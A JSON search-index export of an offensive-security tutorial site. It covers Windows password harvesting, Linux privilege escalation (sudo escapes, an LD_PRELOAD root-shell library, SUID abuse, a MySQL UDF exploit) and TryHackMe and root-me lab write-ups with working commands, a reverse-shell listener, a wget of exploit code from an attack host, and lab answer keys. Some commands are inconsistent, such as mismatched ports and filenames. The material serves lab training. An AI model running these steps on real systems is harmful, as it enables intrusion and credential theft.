[
  {
    "objectID": "28051950f1e83fe9e028167ab4fdd007",
    "u": "https://exploitation.tymyrddin.dev/",
    "t": "Smithing ",
    "c": "Smithing  While exploitation and privilege escalation is not the end goal, it is a key element of the attack life cycle and a major determinant in the success of a penetration test. Testlab Virtual machines Assemblers Compilers Disassemblers Debuggers Decompilers Exploit development Exploitation tools Notes on techniques Introduction Exploiting vulnerabilities Attack infrastructures Common shells Linux Introduction Reuseful escalation patterns Kernel vulnerability exploits Exploit sudo misconfigurations SUID and SGID exploits Exploit capable programs Cron jobs exploits Path exploits NFS exploits Shellcode techniques Windows Introduction Reuseful escalation patterns Harvesting passwords Quick misconfiguration wins Abusing service misconfigurations Abusing dangerous privileges Abusing vulnerable software Shellcode techniques Coding for better understanding of concepts, and for some hands-on. Malware included. Coding shells and exploits Basic TCP reverse shell Execute system commands Keylogger Backdoor Bypasses TryHackMe rooms Introduction Windows PrivEsc Linux PrivEsc Steel Mountain Alfred HackPark Game Zone Skynet The Daily Bugle Overpass 2 hacked Relevant Internal Mr Robot Root-me app-script challenges Introduction Bash: System 1 sudo: weak configuration Bash: System 2 LaTeX: Input Powershell: Command Injection Bash: unquoted expression injection Perl: Command injection Bash: cron Python input() Python pickle",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "dce38b9c4c0a5a981c576fb00a9cf0fc",
    "u": "https://exploitation.tymyrddin.dev/docs/windows/passwords",
    "t": "Harvesting passwords ",
    "c": "Harvesting passwords  Escalate using found credentials in Unattended Windows installations Powershell history Saved Windows credentials IIS configuration Retrieve credentials from software, for example PuTTY Examples  Unattended Windows installations  When installing Windows on a large number of hosts, administrators often use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These unattended installations do not require user interaction. They do require the use of an administrator account for the initial setup, which might end up being stored in the machine in the following locations: C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml Powershell history  Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved. In the cmd.exe prompt: type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt In the Powershell prompt: type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Saved Windows credentials  Windows allows for the use of other users’ credentials. To list saved credentials: cmdkey /list Passwords are not given, but a possibly interesting credential can be used with the runas command and the /savecred option: runas /savecred /user:admin cmd.exe IIS configuration  Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in the web.config file and can store passwords for databases or configured authentication mechanisms. Depending on the version of IIS, it can be found in: C:\\inetpub\\wwwroot\\web.config C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config To find database connection strings on the file: type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString Retrieve credentials from PuTTY  To retrieve the stored proxy credentials, search under the following registry key for ProxyPassword with: reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s Simon Tatham is the creator of PuTTY (and his name is part of the path), and is not the username. Keep command as is. Notes  The example for retrieving credentials from software here is PuTTY. but any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d7f811f1bdf044eda989102541c9bf7d",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/skynet",
    "t": "Skynet ",
    "c": "https://tryhackme.com/room/skynet Skynet  A vulnerable Terminator themed Linux machine. Scanning  First run a simple port scan (without Ping) # nmap -Pn -p- <IP address target machine> -oN portscan portscan: # Nmap 7.92 scan initiated Sat Oct 1 01:57:07 2022 as: nmap -Pn -p- -oN portscan 10.10.62.253 Nmap scan report for 10.10.62.253 Host is up (0.052s latency). Not shown: 65529 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 110/tcp open pop3 139/tcp open netbios-ssn 143/tcp open imap 445/tcp open microsoft-ds # Nmap done at Sat Oct 1 01:58:03 2022 -- 1 IP address (1 host up) scanned in 56.21 seconds Run an -A scan on the open ports: nmap -Pn -T4 -A -p22,80 <IP address target machine> -oN servicescan servicescan: # Nmap 7.92 scan initiated Sat Oct 1 02:02:38 2022 as: nmap -Pn -T4 -A -p22,80,110,139,143,445 -oN servicescan 10.10.62.253 Nmap scan report for 10.10.62.253 Host is up (0.042s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA) | 256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA) |_ 256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Skynet 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL CAPA AUTH-RESP-CODE RESP-CODES TOP UIDL PIPELINING 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 143/tcp open imap Dovecot imapd |_imap-capabilities: LITERAL+ more have post-login Pre-login IMAP4rev1 IDLE ENABLE listed LOGINDISABLEDA0001 ID OK SASL-IR LOGIN-REFERRALS capabilities 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Linux 3.12 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s | smb2-time: | date: 2022-10-01T01:02:53 |_ start_date: N/A | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: skynet | NetBIOS computer name: SKYNET\\x00 | Domain name: \\x00 | FQDN: skynet |_ System time: 2022-09-30T20:02:53-05:00 TRACEROUTE (using port 139/tcp) HOP RTT ADDRESS 1 53.21 ms 10.9.0.1 2 53.38 ms 10.10.62.253 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Oct 1 02:02:55 2022 -- 1 IP address (1 host up) scanned in 17.78 seconds Investigating SMB  # smbclient -L 10.10.62.253 Password for [WORKGROUP\\root]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers anonymous Disk Skynet Anonymous Share milesdyson Disk Miles Dyson Personal Share IPC$ IPC IPC Service (skynet server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP SKYNET One of the shares is called milesdyson, that could be the administrator’s name. And, there is an anonymous share. Connect to the anonymous share: # smbclient //10.10.62.253/anonymous Password for [WORKGROUP\\root]: Try \"help\" to get a list of possible commands. smb: \\> Explore the anonymous share, and get what seems of interest for furthering access: smb: \\> dir . D 0 Thu Nov 26 16:04:00 2020 .. D 0 Tue Sep 17 08:20:17 2019 attention.txt N 163 Wed Sep 18 04:04:59 2019 logs D 0 Wed Sep 18 05:42:16 2019 9204224 blocks of size 1024. 5831512 blocks available smb: \\> get attention.txt getting file \\attention.txt of size 163 as attention.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec) smb: \\> cd logs smb: \\logs\\> dir . D 0 Wed Sep 18 05:42:16 2019 .. D 0 Thu Nov 26 16:04:00 2020 log2.txt N 0 Wed Sep 18 05:42:13 2019 log1.txt N 471 Wed Sep 18 05:41:59 2019 log3.txt N 0 Wed Sep 18 05:42:16 2019 9204224 blocks of size 1024. 5831512 blocks available smb: \\logs\\> mget * Get file log2.txt? y getting file \\logs\\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.6 KiloBytes/sec) Get file log1.txt? y getting file \\logs\\log1.txt of size 471 as log1.txt (2.8 KiloBytes/sec) (average 1.4 KiloBytes/sec) Get file log3.txt? y getting file \\logs\\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.1 KiloBytes/sec) smb: \\logs\\> exit Content of attention.txt : # cat attention.txt A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this. -Miles Dyson A message that would be sent by a system’s administrator, by “Miles Dyson”. Content of logs: # cat log* cyborg007haloterminator terminator22596 terminator219 terminator20 terminator1989 terminator1988 terminator168 terminator16 terminator143 terminator13 terminator123!@# terminator1056 terminator101 terminator10 terminator02 terminator00 roboterminator pongterminator manasturcaluterminator exterminator95 exterminator200 dterminator djxterminator dexterminator determinator cyborg007haloterminator avsterminator alonsoterminator Walterminator 79terminator6 1996terminator Seems to be some kind of password list??? Find hidden files or directories using gobuster: # gobuster dir -u http://10.10.62.253/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.62.253/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2022/10/01 02:21:00 Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 523] /admin (Status: 301) [Size: 312] [--> http://10.10.62.253/admin/] /css (Status: 301) [Size: 310] [--> http://10.10.62.253/css/] /js (Status: 301) [Size: 309] [--> http://10.10.62.253/js/] /config (Status: 301) [Size: 313] [--> http://10.10.62.253/config/] /ai (Status: 301) [Size: 309] [--> http://10.10.62.253/ai/] /squirrelmail (Status: 301) [Size: 319] [--> http://10.10.62.253/squirrelmail/] /server-status (Status: 403) [Size: 277] =============================================================== 2022/10/01 02:33:34 Finished =============================================================== A SquirrelMail entry. Brute-forcing SquirrelMail  Using that loglist of possible passwords, try a brute-forcing attack in Burpsuite intruder with a possible username of milesdyson : Intercept a login attempt, send to Intruder Set position \"admin\" and set payload with list found in logs Run sniper attack Authenticate into SquirrelMail using the password found by Burp Suite intruder. There are three emails, one of which has a subject of “Samba Password reset”, with a rather interesting content: Samba password reset SMB again  Use the password found to log in to the milesdyson share found earlier:...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c1ffa8f27aef3ae5986adf4671f59f3b",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/sudo",
    "t": "Exploit sudo misconfigurations ",
    "c": "Exploit sudo misconfigurations  Become root on Linux via sudo exploit: Find which commands current user is allowed to use ( sudo -l ) Exploit the parameters of a command that is allowed to be executed with root permissions sudo find /etc/passwd -exec /bin/sh \\; sudo vim -c '!sh' sudo awk 'BEGIN {system(“/bin/sh”)}' Or use other commands that are allowed to be executed with root permissions to invoke a shell Example: find  LD_PRELOAD  LD_PRELOAD allows program to use/load shared libraries . If the env_keep option is enabled we can generate a shared library which will be loaded and executed before the program is run. The LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID. Check for env_keep+=LD_PRELOAD (using sudo -l ) Write a simple C code compiled as a share object ( .so extension) file #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); } Save as shell.c and compile: gcc -fPIC -shared -o shell.so shell.c -nostartfiles Use this shared object file when launching any program the user can run with sudo. Run the program with sudo rights and the LD_PRELOAD option pointing to the .so file sudo LD_PRELOAD=/home/user/ldpreload/shell.so find This will result in a shell spawn with root privileges. Another find  Another find in GTFObins for escalating privileges with find : Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64) ... $ sudo -l Matching Defaults entries for karen on ip-10-10-0-32: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User karen may run the following commands on ip-10-10-0-32: (ALL) NOPASSWD: /usr/bin/find (ALL) NOPASSWD: /usr/bin/less (ALL) NOPASSWD: /usr/bin/nano $ id uid=1001(karen) gid=1001(karen) groups=1001(karen) $ sudo find . -exec /bin/sh \\; -quit # id uid=0(root) gid=0(root) groups=0(root) Notes  The sudo command, by default, allows for running a program with root privileges. System administrators sometimes give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap but would not be cleared for full root access. The system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system. Any user can check its current situation related to root privileges using the sudo -l command. Use GTFObins for gathering information on how any program, on which a user may have sudo rights, can be used.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "adeb88b19df6d4fd03b59c0b320698ff",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/kernel",
    "t": "Kernel vulnerability exploits ",
    "c": "Kernel vulnerability exploits  Become root on Linux via kernel exploit: Identify the kernel version Detect vulnerabilities Develop or acquire exploit code Transfer the exploit to the target machine Execute the exploit on the target Example: CVE-2015-1328  For CVE-2015-1328 exploit-db lists several possible exploits: 37292 37293 40688 <= Metasploit, maybe there are other exploits too Using 37292  Create a local file 37292.c in the /tmp/ directory and paste the code in the file Start a local python http server: python -m http.server 8080 From the target machine: wget http://<IP address attack machine>:8888/37292.c Compile on target machine: gcc CVE-2015-1328.c -o 37292 Make executable: chmod +x 37292 Check current user: id Run the compiled exploit: ./exp Check current user: id Using 40688  Upgrade existing shell (meterpreter, ssh, or a basic command shell) to meterpreter session Open a new meterpreter session with: sessions -u <number> Or upgrade the most recently opened session to meterpreter: sessions -u -1 Load the local_exploit_suggester module in msfconsole : meterpreter> use post/multi/recon/local_exploit_suggester Set the SESSION option for the module to the session ID of the meterpreter session, and run Test the exploit modules recommended by local_exploit_suggester . The first few modules in the output usually have a higher chance of working successfully. Load a module, set the module options and exploit An exploit can fail for many reasons. If not works, try the next one or install missing components for it to run. Notes  A failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of the penetration testing engagement before attempting a kernel exploit. You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e433397a746323bc63cff976beeec1dc",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/mr-robot",
    "t": "Mr Robot ",
    "c": "Mr Robot  Key 1  nmap -sC -sV 10.10.245.29 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 01:51 GMT Nmap scan report for 10.10.245.29 Host is up (0.055s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache 443/tcp open ssl/http Apache httpd | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.68 seconds curl -s http://10.10.245.29/robots.txt User-agent: * fsocity.dic key-1-of-3.txt curl -s http://10.10.245.29/key-1-of-3.txt key1 Key 2  fsocity.dic appears to be a dictionary with usernames and passwords. Nikto  nikto -h 10.10.245.29 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.245.29 + Target Hostname: 10.10.245.29 + Target Port: 80 + Start Time: 2022-12-15 02:07:17 (GMT0) --------------------------------------------------------------------------- + Server: Apache + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Retrieved x-powered-by header: PHP/5.5.29 + No CGI Directories found (use '-C all' to force check all possible dirs) + Uncommon header 'tcn' found, with contents: list + Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php + OSVDB-3092: /admin/: This might be interesting... + OSVDB-3092: /readme: This might be interesting... + Uncommon header 'link' found, with contents: <http://10.10.245.29/?p=23>; rel=shortlink + /wp-links-opml.php: This WordPress script reveals the installed version. + OSVDB-3092: /license.txt: License file found may identify site software. + /admin/index.html: Admin login page/section found. + Cookie wordpress_test_cookie created without the httponly flag + /wp-login/: Admin login page/section found. + /wordpress: A Wordpress installation was found. + /wp-admin/wp-login.php: Wordpress login found + /wordpresswp-admin/wp-login.php: Wordpress login found + /blog/wp-login.php: Wordpress login found + /wp-login.php: Wordpress login found + /wordpresswp-login.php: Wordpress login found + 7889 requests: 0 error(s) and 19 item(s) reported on remote host + End Time: 2022-12-15 02:20:20 (GMT0) (783 seconds) --------------------------------------------------------------------------- + 1 host(s) tested Gobuster  gobuster dir -u http://10.10.245.29 -w /usr/share/wordlists/dirb/common.txt -o directories.txt =============================================================== Gobuster v3.3 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.245.29 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.3 [+] Timeout: 10s =============================================================== 2022/12/15 02:29:45 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 213] /.htaccess (Status: 403) [Size: 218] /.htpasswd (Status: 403) [Size: 218] /0 (Status: 301) [Size: 0] [--> http://10.10.245.29/0/] /admin (Status: 301) [Size: 234] [--> http://10.10.245.29/admin/] /atom (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/atom/] /audio (Status: 301) [Size: 234] [--> http://10.10.245.29/audio/] /blog (Status: 301) [Size: 233] [--> http://10.10.245.29/blog/] /css (Status: 301) [Size: 232] [--> http://10.10.245.29/css/] /dashboard (Status: 302) [Size: 0] [--> http://10.10.245.29/wp-admin/] /favicon.ico (Status: 200) [Size: 0] /feed (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/] /images (Status: 301) [Size: 235] [--> http://10.10.245.29/images/] /Image (Status: 301) [Size: 0] [--> http://10.10.245.29/Image/] /image (Status: 301) [Size: 0] [--> http://10.10.245.29/image/] /index.html (Status: 200) [Size: 1188] /index.php (Status: 301) [Size: 0] [--> http://10.10.245.29/] /intro (Status: 200) [Size: 516314] /js (Status: 301) [Size: 231] [--> http://10.10.245.29/js/] /license (Status: 200) [Size: 309] /login (Status: 302) [Size: 0] [--> http://10.10.245.29/wp-login.php] /page1 (Status: 301) [Size: 0] [--> http://10.10.245.29/] /phpmyadmin (Status: 403) [Size: 94] /readme (Status: 200) [Size: 64] /rdf (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/rdf/] /robots (Status: 200) [Size: 41] /robots.txt (Status: 200) [Size: 41] /rss2 (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/] /rss (Status: 301) [Size: 0] [--> http://10.10.245.29/feed/] /sitemap (Status: 200) [Size: 0] /sitemap.xml (Status: 200) [Size: 0] /video (Status: 301) [Size: 234] [--> http://10.10.245.29/video/] /wp-admin (Status: 301) [Size: 237] [--> http://10.10.245.29/wp-admin/] /wp-content (Status: 301) [Size: 239] [--> http://10.10.245.29/wp-content/] /wp-config (Status: 200) [Size: 0] /wp-includes (Status: 301) [Size: 240] [--> http://10.10.245.29/wp-includes/] /wp-cron (Status: 200) [Size: 0] /wp-load (Status: 200) [Size: 0] /wp-links-opml (Status: 200) [Size: 227] /wp-mail (Status: 500) [Size: 3064] /wp-login (Status: 200) [Size: 2664] /wp-settings (Status: 500) [Size: 0] /wp-signup (Status: 302) [Size: 0] [--> http://10.10.245.29/wp-login.php?action=register] /xmlrpc (Status: 405) [Size: 42] /xmlrpc.php (Status: 405) [Size: 42] Progress: 4614 / 4615 (99.98%) =============================================================== 2022/12/15 02:37:48 Finished =============================================================== O, hey, a wp-login . And OSVDB-3092: /license.txt: License file found may identify site software. License  curl -s http://10.10.245.29/license | tr -d \"\\n\" blabla ZWxsaW90OkVSMjgtMDY1Mgo= echo \"ZWxsaW90OkVSMjgtMDY1Mgo=\" | base64 -d elliot:ER28-0652 Login with the credentials: http://10.10.245.29/wp-login Replacing the 404.php with the monkeytest reverse shell . And open a listener on the Kali machine. nc -nlvp 1234 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::1234 Ncat: Listening on 0.0.0.0:1234 Ncat: Connection from 10.10.245.29. Ncat: Connection from 10.10.245.29:49295. Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 02:57:09 up 1:06, 0 users, load average: 0.00, 0.10, 0.74 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1(daemon) gid=1(daemon) groups=1(daemon) /bin/sh: 0: can't access tty; job control turned off $ cd /home/robot $ ls key-2-of-3.txt password.raw-md5 $ cat key-2-of-3.txt cat: key-2-of-3.txt: Permission denied $ cat password.raw-md5 robot:c3fcd3d76192e4007dfb496cca67e13b Look up the md5 . And su - robot . Oh! su: must be run from a terminal . $ which python /usr/bin/python $ python -c 'import pty; pty.spawn(\"/bin/sh\")' Now su : $ su - robot su - robot Password: abcdefghijklmnopqrstuvwxyz $ whoami whoami robot $ cat key-2-of-3.txt cat key-2-of-3.txt Key 3  $ find / -user root -perm -4000 -print 2>/dev/null find / -user root -perm -4000 -print 2>/dev/null /bin/ping /bin/umount /bin/mount /bin/ping6 /bin/su /usr/bin/passwd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/sudo /usr/local/bin/nmap /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e4585ae8ecd35fd992d2acb93a9f5801",
    "u": "https://exploitation.tymyrddin.dev/docs/root-me/bash-cron",
    "t": "Bash: cron ",
    "c": "Bash: cron  root-me challenge: Bash - cron : Challenge connection information. $ ls -la total 24 dr-xr-x--- 2 app-script-ch4-cracked app-script-ch4 4096 Dec 10 2021 . drwxr-xr-x 24 root root 4096 Mar 22 15:29 .. -r-xr-x--- 1 app-script-ch4-cracked app-script-ch4 767 Dec 10 2021 ch4 lrwxrwxrwx 1 root root 11 Dec 10 2021 cron.d -> /tmp/._cron -rw-r----- 1 root root 42 Dec 10 2021 .git -r--r----- 1 app-script-ch4-cracked app-script-ch4-cracked 16 Dec 10 2021 .passwd -r-------- 1 root root 629 Dec 10 2021 ._perms echo '#!/bin/sh\\ncat .passwd > /tmp/whatever' > cron.d/task1;chmod 4777 cron.d/task1 Wait for it and cat /tmp/whatever .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ab9555fb5250ae28ed581177eea1fc41",
    "u": "https://exploitation.tymyrddin.dev/docs/root-me/sudo-weak-config",
    "t": "sudo: weak configuration ",
    "c": "sudo: weak configuration  root-me challenge: sudo-weak-configuration : Wishing to simplify the task by not modifying rights, the administrator has not thought about the side effects … -l lists the user’s privileges: $ sudo -l [sudo] password for app-script-ch1: ... User app-script-ch1 may run the following commands on challenge02: (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/* The * can be anything … The -u flag gives the option to run a command as a user other than the default target user (usually root): sudo -u [different_username] command The user may be either a username or a numeric user-ID ( UID ) prefixed with the # character (e.g., #0 for UID 0 ). When running commands as a UID, many shells require that the # be escaped with a backslash ( \\ ). Some security policies may restrict UID s to those listed in the password database. The sudoers policy allows UID s that are not in the password database as long as the targetpw option is not set. Other security policies may not support this. Resources  Permissions POSIX sudo you are doing it wrong",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d564105e5d4b48a30f571723bd619df9",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/suid",
    "t": "SUID and SGID exploits ",
    "c": "SUID and SGID exploits  Become root on Linux via SUID: List files that have SUID or SGID bits set Exploit Example: nano  Crack passwords file  List files that have SUID or SGID bits set: find / -type f -perm -04000 -ls 2>/dev/null Compare these executables with GTFOBins SUID . The nano text editor has the SUID bit set Read /etc/passwd and /etc/shadow using nano. Copy contant to local passwd.txt resp shadow.txt files. Use the unshadow tool to create a file crackable by John the Ripper unshadow passwd.txt shadow.txt > passwords.txt Add a user  The other option would be to add a new user that has root privileges. Using the openssl tool, create a password hash for a new user: openssl passwd -1 -salt <password> Add this password with a username to the /etc/passwd file. Use root:/bin/bash to give this user a root shell. Switch to this user. Notes  SUID (Set-user Identification) and SGID (Set-group Identification) allow files to be executed with the permission level of the file owner or the group owner, respectively. Such files have an s bit set showing their special permission level. To find binaries known to be exploitable when the SUID bit is set see GTFObins SUID .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2a861562e3291fd2023edb2eb6d44b56",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/linux-privesc",
    "t": "Linux PrivEsc ",
    "c": "https://tryhackme.com/room/linuxprivesc Linux PrivEsc  This room is excellent for reinforcement of the most common Linux privilege escalation techniques. After each technique, exit out of the root shell gained, and/or re-establish a session as the user account before starting a next task! uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev) Service exploits  The MySQL service is running as root and the “root” user for the service does not have a password assigned. We can use a that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service. Change into the /home/user/tools/mysql-udf directory: cd /home/user/tools/mysql-udf Compile the raptor_udf2.c exploit code: gcc -g -c raptor_udf2.c -fPIC gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc Connect to the MySQL service as the root user with a blank password: mysql -u root Execute the following commands on the MySQL shell to create a User Defined Function (UDF) do_system using the compiled exploit: use mysql; create table foo(line blob); insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so'; create function do_system returns integer soname 'raptor_udf2.so'; Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission: select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'); Exit out of the MySQL shell (type exit or \\q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges: /tmp/rootbash -p Remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later. rm /tmp/rootbash exit Weak file permissions - Readable /etc/shadow  The /etc/shadow file contains user password hashes and is usually readable only by the root user. The /etc/shadow file on the lab VM is world-readable. Check with: ls -l /etc/shadow To view the contents of the /etc/shadow file: cat /etc/shadow Each line of the file represents a user. A user’s password hash (if they have one) can be found between the first and second colons ( : ) of each line. Save the root user’s hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Switch to the root user, using the cracked password: su root Exit out of the root shell before continuing! Questions  What is the root user’s password hash? Answer: $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0 What hashing algorithm was used to produce the root user’s password hash? Answer: sha512crypt What is the root user’s password? Answer: password123 Weak file permissions - Writable /etc/shadow  The /etc/shadow file contains user password hashes and is usually readable only by the root user. The /etc/shadow file on the VM is world-writable. Check with: ls -l /etc/shadow Generate a new password hash with a password of your choice: mkpasswd -m sha-512 newpasswordhere Edit the /etc/shadow file and replace the original root user’s password hash with the one just generated. Switch to the root user, using the new password: su root Exit out of the root shell before continuing! Weak file permissions - Writable /etc/passwd  The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there. The /etc/passwd file is world-writable. Check with: ls -l /etc/passwd Generate a new password hash with a password of your choice: openssl passwd newpasswordhere Edit the /etc/passwd file and place the generated password hash between the first and second colon ( : ) of the root user’s row (replacing the “x”). Switch to the root user, using the new password: su root Alternatively, copy the root user’s row and append it to the bottom of the file, changing the first instance of the word root to newroot and placing the generated password hash between the first and second colon (replacing the “x”). Now switch to the newroot user, using the new password: su newroot Exit out of the root shell before continuing! Questions  Run the “id” command as the newroot user. What is the result? Answer: uid=0(root) gid=0(root) groups=0(root) Shell escape sequences  List the programs which sudo allows your user to run: sudo -l Visit GTFOBins and search for the program names. If the program is listed with sudo as a function, it can be used to elevate privileges, usually via an escape sequence. Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins. For an extra challenge, try to gain a root shell using all the programs on the list! Exit out of the root shell before continuing! Questions  How many programs is user allowed to run via sudo? Answer: 11 One program on the list 